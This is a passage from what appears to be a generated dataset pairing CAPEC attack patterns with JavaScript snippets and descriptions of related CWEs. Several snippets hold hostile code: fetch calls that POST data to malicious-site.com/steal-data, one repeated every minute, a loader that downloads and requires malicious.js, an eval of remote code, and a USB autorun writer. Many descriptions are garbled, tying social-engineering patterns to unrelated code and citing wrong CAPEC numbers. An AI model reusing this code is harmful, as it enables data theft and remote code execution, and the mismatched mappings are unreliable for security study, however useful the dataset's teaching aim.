        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.input;\n  try {\n    // CWE-1286: Improper Validation of Syntactic Correctness of Input\n    if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n      throw new Error('Invalid input syntax');\n    }\n    // CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n    const template = `<div>${userInput}</div>`;\n    res.send(template);\n  } catch (error) {\n    // CWE-81: Improper Neutralization of Script in an Error Message Web Page\n    res.status(400).send(`Error: ${error.message}`);\n    // CWE-209: Generation of Error Message Containing Sensitive Information\n    console.error('Error details:', error);\n  }\n});\n\n// CWE-1125: Excessive Attack Surface\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet represents a vulnerable Express.js application that embodies the deprecated CAPEC pattern of 'Target Influence via Neuro-Linguistic Programming (NLP)' by demonstrating improper handling of user input and error messages. The code includes several related CWEs:\n\n1. CWE-1286: The input is expected to be alphanumeric but is not properly validated, allowing potentially harmful input.\n2. CWE-1336: The user input is directly inserted into a template without proper neutralization, making it susceptible to template injection attacks.\n3. CWE-81: Error messages are not properly neutralized, allowing script injection in error pages.\n4. CWE-209: Detailed error messages are logged, potentially exposing sensitive information.\n5. CWE-1125: The application listens on a public port, increasing the attack surface.\n\nOverall, the code demonstrates how improper input validation and error handling can lead to security vulnerabilities."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/process', (req, res) => {\n  const userInput = req.body.input;\n  // CWE-1286: Improper Validation of Syntactic Correctness of Input\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n\n  // CWE-149: Improper Neutralization of Quoting Syntax\n  const sanitizedInput = userInput.replace(/['\"`]/g, '');\n\n  // CWE-804: Guessable CAPTCHA\n  const captcha = req.body.captcha;\n  if (captcha !== '1234') { // Weak CAPTCHA\n    return res.status(400).send('Invalid CAPTCHA');\n  }\n\n  // Process the sanitized input\n  res.send(`Processed input: ${sanitizedInput}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that processes user input. It embodies the main idea of the deprecated CAPEC 'Target Influence via Voice in NLP' by demonstrating how improper handling of user input can lead to vulnerabilities. The code includes checks for CWE-1286 (Improper Validation of Syntactic Correctness of Input) by validating the input against a regex pattern. It also addresses CWE-149 (Improper Neutralization of Quoting Syntax) by sanitizing the input to remove quotes. Additionally, it includes a weak CAPTCHA implementation (CWE-804) that can be easily guessed, highlighting the potential for automated attacks. The code serves as an example of how improper input validation and weak security measures can lead to vulnerabilities in a web application."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "function sendMessage(message) {\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  let encodedMessage = btoa(message); // Encoding message in base64 (not secure)\n  let channel = new WebSocket('ws://example.com');\n  channel.onopen = function() {\n    // CWE-120: Buffer Copy without Checking Size of Input\n    let buffer = new ArrayBuffer(1024);\n    let view = new Uint8Array(buffer);\n    for (let i = 0; i < encodedMessage.length; i++) {\n      view[i] = encodedMessage.charCodeAt(i);\n    }\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    channel.send(buffer);\n  };\n  channel.onmessage = function(event) {\n    // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n    let receivedBuffer = new Uint8Array(event.data);\n    let receivedMessage = '';\n    for (let i = 0; i < receivedBuffer.length; i++) {\n      receivedMessage += String.fromCharCode(receivedBuffer[i]);\n    }\n    // CWE-806: Buffer Access Using Size of Source Buffer\n    let decodedMessage = atob(receivedMessage);\n    console.log('Received:', decodedMessage);\n  };\n}",
        "description": "This JavaScript code snippet demonstrates a WebSocket communication where a message is sent and received. The message is encoded in base64 (CWE-319) and sent over a WebSocket connection. The code does not check the size of the input buffer before copying it to the output buffer (CWE-120), potentially leading to a buffer overflow. Additionally, the integrity of the message is not verified during transmission (CWE-924), and the code improperly handles memory buffer operations (CWE-119, CWE-806). This represents the main idea of the CAPEC by embedding messages within communication that could be interpreted at a subconscious level, while also highlighting the related weaknesses."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "const sensitiveData = { user: 'JohnDoe', email: 'john.doe@example.com', balance: 1000 };\n\nfunction getUserData(query) {\n  if (query === 'balance') {\n    return sensitiveData.balance;\n  } else if (query === 'email') {\n    return sensitiveData.email;\n  } else if (query === 'user') {\n    return sensitiveData.user;\n  } else {\n    return 'Invalid query';\n  }\n}\n\n// Simulating an attacker querying the system\nconsole.log(getUserData('balance')); // Attacker infers balance\nconsole.log(getUserData('email')); // Attacker infers email\nconsole.log(getUserData('user')); // Attacker infers username\n\n// Observable behavioral discrepancy\nfunction login(username, password) {\n  if (username === 'admin' && password === 'admin123') {\n    return 'Login successful';\n  } else if (username === 'admin') {\n    return 'Incorrect password';\n  } else {\n    return 'User not found';\n  }\n}\n\nconsole.log(login('admin', 'wrongpassword')); // Reveals username existence\nconsole.log(login('nonexistent', 'password')); // Reveals user does not exist\n\n// Guessable CAPTCHA\nfunction validateCaptcha(input) {\n  const captcha = '1234';\n  return input === captcha ? 'CAPTCHA passed' : 'CAPTCHA failed';\n}\n\nconsole.log(validateCaptcha('1234')); // CAPTCHA easily guessable\n\n// Missing source correlation\nconst dataSource1 = { balance: 1000 };\nconst dataSource2 = { balance: 1000 };\n\nfunction getBalance() {\n  return dataSource1.balance;\n}\n\nconsole.log(getBalance()); // No correlation between data sources",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Target Influence via Interview and Interrogation' and the associated CWEs. The `getUserData` function exposes sensitive information through data queries (CWE-202). The `login` function reveals observable behavioral discrepancies (CWE-205) by providing different responses based on the username's existence. The `validateCaptcha` function uses a guessable CAPTCHA (CWE-804), making it easy for non-human actors to bypass. Finally, the `getBalance` function relies on a single data source without cross-verifying with another source, illustrating the missing source correlation issue (CWE-1293). This code highlights how attackers can infer sensitive information and exploit system vulnerabilities through targeted queries and observations."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (req.headers['x-custom-header'] !== 'expected-value') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const options = {\n    hostname: 'example.com',\n    port: 80,\n    path: '/api',\n    method: 'GET'\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    proxyRes.pipe(res, { end: true });\n  });\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  req.pipe(proxyReq, { end: true });\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates several vulnerabilities related to the CAPEC 'Target Influence via Instant Rapport' and the associated CWEs. The server listens for incoming requests and performs the following actions:\n\n1. CWE-940: Improper Verification of Source of a Communication Channel - The server checks for a custom header 'x-custom-header' but does not adequately verify the source of the request, making it susceptible to spoofing.\n\n2. CWE-941: Incorrectly Specified Destination in a Communication Channel - The server forwards the request to a hardcoded destination ('example.com'), which may not be the intended or correct destination.\n\n3. CWE-300: Channel Accessible by Non-Endpoint - The server forwards the incoming request to the proxy request without ensuring the integrity or identity of the endpoints, allowing potential unauthorized access or influence.\n\nThis code snippet embodies the main idea of the CAPEC by demonstrating how an attacker could exploit these weaknesses to influence the target system via an established rapport or communication channel."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "const fs = require('fs');\n\n// Simulate reliance on an insufficiently trustworthy component\nconst untrustedComponent = require('./untrustedComponent');\n\n// Simulate unprotected confidential information\nconst confidentialData = 'Sensitive Information';\n\n// Simulate product released in non-release configuration\nconst isProduction = false;\n\n// Simulate insufficient technical documentation\nconst technicalDocs = null;\n\n// Simulate reliance on a non-updateable component\nconst nonUpdateableComponent = { version: '1.0.0', updateable: false };\n\n// Function to simulate modification during manufacture\nfunction modifyDuringManufacture() {\n  if (!isProduction) {\n    console.log('Warning: Product is in non-release configuration.');\n  }\n  if (!technicalDocs) {\n    console.log('Warning: Insufficient technical documentation.');\n  }\n  if (!nonUpdateableComponent.updateable) {\n    console.log('Warning: Component is not updateable.');\n  }\n  // Simulate malicious modification\n  untrustedComponent.modify(confidentialData);\n  console.log('Product modified during manufacture.');\n}\n\nmodifyDuringManufacture();",
        "description": "This JavaScript code snippet simulates a scenario where an attacker modifies a product during its manufacture, embodying the main idea of CAPEC-Name: 'Modification During Manufacture'. The code includes several related CWEs: reliance on an insufficiently trustworthy component, unprotected confidential information, product released in non-release configuration, insufficient technical documentation, and reliance on a non-updateable component. The `modifyDuringManufacture` function checks for these vulnerabilities and simulates a malicious modification using an untrusted component. This represents the potential risks and attack vectors during the manufacturing process."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate a third-party component with a known vulnerability\nconst vulnerableComponent = require('vulnerable-component');\n\n// Function to read sensitive configuration file\nfunction readConfig(filePath) {\n  if (!fs.existsSync(filePath)) {\n    throw new Error('Configuration file not found');\n  }\n  return fs.readFileSync(filePath, 'utf8');\n}\n\n// Path to the configuration file\nconst configPath = path.join(__dirname, 'config', 'config.json');\n\n// Read the configuration file\nlet config;\ntry {\n  config = readConfig(configPath);\n} catch (error) {\n  console.error('Error reading configuration:', error.message);\n}\n\n// Simulate exposure of sensitive information\nconsole.log('Configuration:', config);\n\n// Simulate observable behavioral discrepancy\nif (process.env.NODE_ENV !== 'production') {\n  console.warn('Warning: Running in non-production mode');\n}\n\n// Use the vulnerable component\nvulnerableComponent.doSomething();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Manipulation During Distribution'. It includes the use of a third-party component with a known vulnerability (CWE-1395), reads a sensitive configuration file and exposes its content (CWE-200), and checks if the environment is not in production mode, which could indicate a non-release configuration (CWE-1269). Additionally, the code logs a warning if it is not running in production mode, which could lead to an observable behavioral discrepancy (CWE-207). The main idea is to show how an attacker could manipulate or tamper with a product during its distribution by exploiting these weaknesses."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "class HardwareComponent {\n  constructor(version) {\n    this.version = version;\n    this.redundancy = true;\n  }\n\n  injectError() {\n    // CWE-1334: Unauthorized Error Injection\n    this.redundancy = false;\n    console.log('Error injected, redundancy compromised.');\n  }\n\n  applyVoltageGlitch() {\n    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    console.log('Voltage glitch applied, system stability compromised.');\n  }\n\n  downgradeFirmware(newVersion) {\n    // CWE-1328: Security Version Number Mutable to Older Versions\n    this.version = newVersion;\n    console.log(`Firmware downgraded to version ${newVersion}.`);\n  }\n}\n\n// Simulating an attack\nconst component = new HardwareComponent('1.0.0');\ncomponent.injectError();\ncomponent.applyVoltageGlitch();\ncomponent.downgradeFirmware('0.9.0');",
        "description": "This JavaScript code snippet represents a simplified simulation of a hardware integrity attack. The `HardwareComponent` class models a hardware component with a version number and redundancy feature. The `injectError` method simulates an unauthorized error injection (CWE-1334), compromising the component's redundancy. The `applyVoltageGlitch` method simulates the application of a voltage glitch (CWE-1247), affecting system stability. The `downgradeFirmware` method allows downgrading the firmware to an older, potentially vulnerable version (CWE-1328). This code embodies the main idea of the CAPEC by demonstrating how an adversary might exploit weaknesses in the system maintenance process to compromise hardware integrity."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "function benignFunction() {\n  // This function appears to be harmless\n  console.log('Hello, World!');\n}\n\nfunction maliciousLogic() {\n  // Hidden malicious logic\n  fetch('https://malicious-site.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive information' })\n  });\n}\n\n// Improper access control allows unauthorized execution of malicious logic\nif (user.isAdmin) {\n  benignFunction();\n} else {\n  maliciousLogic();\n}\n\n// Replicating malicious code\nsetInterval(() => {\n  maliciousLogic();\n}, 60000); // Execute every minute\n\n// Firmware not updateable - no mechanism to patch this vulnerability\n// Creation of emergent resource - the malicious logic creates network traffic\n",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Logic Insertion' by embedding hidden malicious logic within a seemingly benign function. The `benignFunction` appears harmless, logging 'Hello, World!' to the console. However, the `maliciousLogic` function sends sensitive information to a malicious site. Improper access control is illustrated by conditionally executing the malicious logic if the user is not an admin. The code also includes a mechanism to repeatedly execute the malicious logic every minute, representing replicating malicious code. The lack of a mechanism to update or patch the code represents firmware that is not updateable. Additionally, the malicious logic creates network traffic, which can be seen as the creation of an emergent resource that can be exploited by attackers."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "function benignFunction() {\n  console.log('This is a benign function.');\n}\n\nfunction maliciousFunction() {\n  // Malicious code hidden from the user\n  fetch('https://malicious-site.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive information' })\n  });\n}\n\n// Trojan Horse: calling the malicious function within a benign function\nfunction trojanHorse() {\n  benignFunction();\n  maliciousFunction();\n}\n\ntrojanHorse();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The 'benignFunction' appears to be harmless and performs a simple console log. However, the 'maliciousFunction' contains hidden malicious logic that sends sensitive information to a remote server. The 'trojanHorse' function combines both the benign and malicious functions, making the malicious activity less noticeable. This represents CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse), where the malicious code is hidden within seemingly benign functionality. The code is executed by calling 'trojanHorse', which triggers both the benign and malicious actions."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "function downloadAndExecute(url) {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Error:', error));\n}\n\n// Malicious logic inserted by an authorized developer\nfunction maliciousFunction() {\n  // CWE-506: Embedded Malicious Code\n  console.log('Executing malicious code');\n  // CWE-1229: Creation of Emergent Resource\n  let emergentResource = new Function('return this')();\n  emergentResource.maliciousProperty = 'maliciousValue';\n}\n\n// Insecure permissions example\nlet insecureObject = {};\nObject.defineProperty(insecureObject, 'insecureProperty', {\n  value: 'insecure',\n  writable: true, // CWE-277: Insecure Inherited Permissions\n  enumerable: true,\n  configurable: true\n});\n\n// Lack of administrator control over security\nlet securitySettings = {\n  adminControl: false // CWE-671: Lack of Administrator Control over Security\n};\n\n// Simulate the injection of malicious logic\nmaliciousFunction();\n",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Logic Inserted Into Product by Authorized Developer' (CAPEC). The `downloadAndExecute` function fetches and executes code from a remote URL without verifying its integrity (CWE-494). The `maliciousFunction` contains embedded malicious code (CWE-506) that creates an emergent resource (CWE-1229) by adding a property to the global object. An object with insecure inherited permissions is defined (CWE-277), and a security settings object is created with a lack of administrator control (CWE-671). The `maliciousFunction` is then called to simulate the injection of malicious logic."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "function authenticate(user, password) {\n  // Security-critical check\n  if (user === 'admin' && password === 'securePassword') {\n    console.log('Authenticated');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Malicious code inserted during development\nfunction authenticate(user, password) {\n  if (user === 'admin') {\n    console.log('Authenticated'); // Bypass password check\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Usage\nauthenticate('admin', 'wrongPassword');",
        "description": "This JavaScript code snippet demonstrates a development alteration attack where an adversary modifies the authentication function during development. The original function includes a security-critical check to authenticate a user based on both username and password. However, the malicious version of the function bypasses the password check entirely, allowing any user with the username 'admin' to be authenticated regardless of the password. This embodies the CAPEC concept of modifying a system during development to introduce vulnerabilities that can be exploited later. The related CWEs are represented by the removal of security-critical code (CWE-733, CWE-1037) and the insertion of malicious code (CWE-506)."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://untrusted-source.com/malicious.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    fs.writeFileSync('malicious.js', data);\n    require('./malicious.js');\n  });\n});\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nlet dynamicCode = 'console.log(\"Executing dynamic code\");';\neval(dynamicCode);",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can manipulate a configuration management system to insert malicious logic into a software product. The code downloads a JavaScript file from an untrusted source (CWE-494) without verifying its integrity. It then writes this file to the local filesystem and includes it in the application (CWE-829). Additionally, the code dynamically evaluates a string as code (CWE-913), which can be exploited if the string is controlled by an attacker. This snippet embodies the main idea of CAPEC-439 by showing how an adversary can insert malicious logic into a product's build or update process through configuration management manipulation."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "const http = require('http');\nconst untrustedLib = require('untrusted-lib'); // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n\nhttp.createServer((req, res) => {\n  if (req.url === '/data') {\n    untrustedLib.getData() // CWE-1395: Dependency on Vulnerable Third-Party Component\n      .then(data => {\n        res.writeHead(200, {'Content-Type': 'application/json'});\n        res.end(JSON.stringify(data));\n      })\n      .catch(err => {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Internal Server Error');\n      });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://localhost:8080/');\n});\n\n// CWE-506: Embedded Malicious Code\nuntrustedLib.executeMaliciousCode();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP server that includes and uses an untrusted third-party library ('untrusted-lib'). The server listens for requests and uses the untrusted library to fetch data when the '/data' endpoint is accessed. This represents CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) and CWE-1395 (Dependency on Vulnerable Third-Party Component). Additionally, the untrusted library contains a function call to 'executeMaliciousCode', representing CWE-506 (Embedded Malicious Code). This code embodies the main idea of CAPEC-442, where an adversary could insert malicious logic into a product via the inclusion of an insecure third-party component."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side enforcement of server-side security (CWE-602)\n  if (username === 'admin' && password === 'password123') {\n    // Violation of Secure Design Principles (CWE-657)\n    console.log('Authentication successful');\n    // Exposure of Sensitive System Information (CWE-497)\n    console.log('Welcome, admin! Here is the sensitive data: [Sensitive Data]');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Design alteration: The design includes a hardcoded password and client-side authentication\n// which can be exploited once the system is deployed.\nauthenticateUser('admin', 'password123');",
        "description": "This JavaScript code snippet demonstrates a design alteration attack by embedding several vulnerabilities into the design of an authentication function. The function `authenticateUser` performs client-side authentication (CWE-602) using hardcoded credentials, which violates secure design principles (CWE-657). Upon successful authentication, it exposes sensitive system information (CWE-497) by logging sensitive data to the console. This design flaw can be exploited once the system is deployed, embodying the main idea of a design alteration attack as described in the CAPEC."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst dllPath = process.env.DLL_PATH || './default.dll';\n\n// CWE-1102: Machine-Dependent Data Representation\nconst machineDependentData = Buffer.from([0x90, 0x90, 0x90, 0x90]); // NOP sled for x86 architecture\n\n// CWE-506: Embedded Malicious Code\nfunction embedVirus(dllPath) {\n  try {\n    let dllData = fs.readFileSync(dllPath);\n    let virusCode = Buffer.from('malicious code here');\n    let paddedDllData = Buffer.concat([dllData, machineDependentData, virusCode]);\n    fs.writeFileSync(dllPath, paddedDllData);\n    console.log('Virus embedded successfully');\n  } catch (err) {\n    console.error('Failed to embed virus:', err);\n  }\n}\n\n// CWE-509: Replicating Malicious Code\nfunction replicateVirus() {\n  const targetPaths = ['/path/to/target1.dll', '/path/to/target2.dll'];\n  targetPaths.forEach(targetPath => embedVirus(targetPath));\n}\n\n// CWE-497: Exposure of Sensitive System Information\nfunction stealSensitiveData() {\n  const sensitiveData = fs.readFileSync('/path/to/sensitive/data');\n  console.log('Stolen Data:', sensitiveData.toString());\n}\n\n// Main execution\nembedVirus(dllPath);\nreplicateVirus();\nstealSensitiveData();",
        "description": "This JavaScript code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code leverages several CWEs to illustrate the vulnerabilities involved. It starts by defining an untrusted search path (CWE-426) for the DLL. It then uses machine-dependent data representation (CWE-1102) to create a buffer that could be used to pad the DLL. The `embedVirus` function reads the DLL, appends malicious code (CWE-506), and writes it back to the file. The `replicateVirus` function demonstrates how the virus could replicate itself to other DLLs (CWE-509). Finally, the `stealSensitiveData` function shows how the virus could expose sensitive system information (CWE-497). This code is a simplified example and should not be used for malicious purposes."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to simulate malware propagation via USB stick\nfunction propagateMalware(usbPath) {\n  const maliciousFile = path.join(usbPath, 'malware.exe');\n  const benignFile = path.join(usbPath, 'readme.txt');\n\n  // Check if USB path exists\n  if (fs.existsSync(usbPath)) {\n    // Create a benign file\n    fs.writeFileSync(benignFile, 'This is a harmless readme file.');\n    console.log('Benign file created:', benignFile);\n\n    // Create a hidden malicious file\n    fs.writeFileSync(maliciousFile, 'This is a malicious executable.');\n    console.log('Malicious file created:', maliciousFile);\n  } else {\n    console.error('USB path does not exist:', usbPath);\n  }\n}\n\n// Example usage\npropagateMalware('E:\\');",
        "description": "This JavaScript code snippet simulates the propagation of malware via a USB stick, embodying the main idea of the deprecated CAPEC-448. The function `propagateMalware` takes a USB path as input and creates two files: a benign `readme.txt` and a hidden malicious `malware.exe`. This represents CWE-507 (Trojan Horse) and CWE-506 (Embedded Malicious Code) by embedding malicious functionality within seemingly benign operations. The code also checks if the USB path exists before proceeding, which is a basic validation step. This snippet highlights the risk of malware spreading through removable media by creating hidden malicious files alongside benign ones."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst userSuppliedPath = process.argv[2];\nconst fullPath = path.join(userSuppliedPath, 'malicious.dll');\n\n// CWE-67: Improper Handling of Windows Device Names\nif (fullPath.includes('CON') || fullPath.includes('AUX')) {\n  console.error('Invalid path containing Windows device name.');\n  process.exit(1);\n}\n\n// CWE-507: Trojan Horse\n// CWE-506: Embedded Malicious Code\n// CWE-509: Replicating Malicious Code (Virus or Worm)\nfs.writeFileSync(fullPath, 'malicious code here');\nconsole.log('Malicious DLL written to ' + fullPath);\n\n// Simulate propagation\nconst usbPath = 'E:\\autorun.inf';\nfs.writeFileSync(usbPath, '[autorun]\\nopen=' + fullPath);\nconsole.log('Autorun file created at ' + usbPath);",
        "description": "This JavaScript code snippet demonstrates a malicious attack pattern where a DLL containing malicious code is written to a user-supplied path, potentially exploiting CWE-426 (Untrusted Search Path) and CWE-67 (Improper Handling of Windows Device Names). The code also simulates the propagation of the malicious code via an autorun file on a USB drive, embodying the concept of malware propagation and replication (CWE-507, CWE-506, and CWE-509). The code checks for invalid Windows device names to avoid immediate failure and writes a malicious DLL to the specified path, then creates an autorun file to propagate the malware when the USB drive is accessed."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "const fs = require('fs');\nconst usb = require('usb');\n\n// Simulate malware propagation via infected USB device\nusb.on('attach', function(device) {\n    console.log('USB device attached:', device);\n    // Check if the device is a known infected device\n    if (device.deviceDescriptor.idVendor === 1234 && device.deviceDescriptor.idProduct === 5678) {\n        console.log('Infected USB device detected. Executing hidden payload...');\n        // Hidden malicious payload\n        fs.writeFile('/tmp/malicious_file', 'This is a malicious file', function(err) {\n            if (err) throw err;\n            console.log('Malicious file created');\n        });\n    }\n});",
        "description": "This JavaScript code snippet demonstrates a simplified example of malware propagation via an infected USB device. It uses the 'usb' library to detect when a USB device is attached. If the device matches a known infected device (identified by vendor and product IDs), it executes a hidden payload that writes a malicious file to the system. This embodies the main idea of the deprecated CAPEC-448, which involves malware infection through peripheral devices. The code also touches on CWE-507 (Trojan Horse) by including hidden malicious functionality that violates the intended security policy."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "class HardwareDevice {\n  constructor() {\n    this.registers = new Array(10).fill(0);\n    this.debugMode = false;\n  }\n\n  enableDebugMode() {\n    this.debugMode = true;\n  }\n\n  writeRegister(index, value) {\n    if (this.debugMode || index < this.registers.length) {\n      this.registers[index] = value;\n    } else {\n      console.log('Access denied to register');\n    }\n  }\n\n  readRegister(index) {\n    if (this.debugMode || index < this.registers.length) {\n      return this.registers[index];\n    } else {\n      console.log('Access denied to register');\n      return null;\n    }\n  }\n\n  maliciousLogic() {\n    // Hidden malicious logic\n    if (this.debugMode) {\n      console.log('Malicious code executed');\n      // Perform malicious actions\n    }\n  }\n}\n\n// Example usage\nconst device = new HardwareDevice();\ndevice.enableDebugMode();\ndevice.writeRegister(5, 1234);\ndevice.maliciousLogic();",
        "description": "This JavaScript code snippet represents a simplified model of a hardware device with registers and a debug mode. The `HardwareDevice` class contains methods to enable debug mode, write to registers, and read from registers. The `maliciousLogic` method simulates hidden malicious logic that only executes when the debug mode is enabled. This code embodies the main idea of the CAPEC 'Infected Hardware' by demonstrating how an adversary could insert malicious logic into hardware and activate it through a debug mode. The related CWEs are represented by the improper access control to registers (CWE-1262), the ability to activate debug logic at runtime (CWE-1313), and the presence of embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "function authenticateUser(token) {\n  // CWE-294: Capture-replay vulnerability\n  if (isValidToken(token)) {\n    // CWE-506: Embedded Malicious Code\n    if (token === 'maliciousToken') {\n      executeMaliciousLogic();\n    }\n    return true;\n  }\n  return false;\n}\n\nfunction isValidToken(token) {\n  // Simulate token validation\n  return token === 'validToken' || token === 'maliciousToken';\n}\n\nfunction executeMaliciousLogic() {\n  console.log('Executing malicious logic...');\n  // Malicious code that could degrade system redundancy (CWE-1334)\n  injectErrorsIntoSystem();\n}\n\nfunction injectErrorsIntoSystem() {\n  console.log('Injecting errors into the system to degrade redundancy...');\n  // Simulate error injection\n}",
        "description": "This JavaScript code snippet demonstrates a simplified version of a malicious logic insertion attack via counterfeit hardware, as described in the deprecated CAPEC. The `authenticateUser` function contains a capture-replay vulnerability (CWE-294), allowing an attacker to bypass authentication by replaying a valid or malicious token. If the token is identified as 'maliciousToken', the code executes embedded malicious logic (CWE-506) through the `executeMaliciousLogic` function. This function simulates the injection of errors into the system (CWE-1334), which could degrade hardware redundancy. The code highlights the potential risks of embedded malicious code and the impact of unauthorized error injection on system reliability."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class Device {\n  constructor() {\n    this.firmware = 'v1.0';\n    this.undocumentedFeature = this.maliciousCode();\n  }\n\n  maliciousCode() {\n    // Malicious code that compromises the device\n    console.log('Malicious code executed');\n    // Example of data modification\n    this.firmware = 'v1.0-malicious';\n  }\n\n  updateFirmware(newFirmware) {\n    // Simulate a non-updateable component\n    console.log('Firmware update failed: component not updateable');\n  }\n}\n\nconst device = new Device();\ndevice.updateFirmware('v2.0');",
        "description": "This JavaScript code snippet represents a device class that contains malicious code embedded within an undocumented feature. The `maliciousCode` method is executed during the instantiation of the device, modifying the firmware version to indicate a compromise. The `updateFirmware` method simulates a failure to update the firmware, representing a reliance on a non-updateable component. This snippet embodies the main idea of CAPEC-452 by demonstrating the insertion of malicious logic into product hardware and highlights related weaknesses such as embedded malicious code (CWE-506), reliance on non-updateable components (CWE-1329), and inclusion of undocumented features (CWE-1242)."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "function authenticateUser(username, password) {\n  if (username === 'admin' && password === 'password123') {\n    console.log('Authentication successful');\n    // Malicious code insertion\n    if (Math.random() < 0.5) {\n      console.log('Injecting error to degrade system redundancy');\n      // Simulate error injection\n      throw new Error('Injected error');\n    }\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Simulate user authentication\ntry {\n  authenticateUser('admin', 'password123');\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a simplified example of malicious logic insertion into a product's hardware, as described in CAPEC-457. The `authenticateUser` function checks for hardcoded credentials ('admin' and 'password123'). Upon successful authentication, it randomly decides to inject an error, simulating the degradation of system redundancy (CWE-1334). This represents the concept of embedding malicious code (CWE-506) that can compromise the system's integrity. The code also highlights the risk of authentication bypass issues (CWE-592) by using hardcoded credentials."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
